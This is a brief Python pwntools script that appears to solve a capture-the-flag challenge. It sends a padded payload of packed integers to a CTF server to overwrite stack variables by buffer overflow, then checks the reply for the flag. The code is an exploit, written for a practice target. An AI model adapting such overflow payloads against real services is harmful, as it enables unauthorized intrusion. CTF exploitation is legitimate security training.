from pwn import *

p = remote('challenges.auctf.com',30011)

l10 = 0x1337
l18 = 0x667463
l20 = 0x2a
l14 = 0xFFFFFFEB

padd = "A" * 16

payload = ""
payload += padd
payload += p32(l20)
payload += p32(0xff)
payload += p32(l18)
payload += p32(l14)
payload += p32(l10)

p.recvuntil("got!\n\n")
p.sendline(payload)
if "auctf{" in p.recv(1024):
	print "we have a flag"
else:
	print "FUK ME"







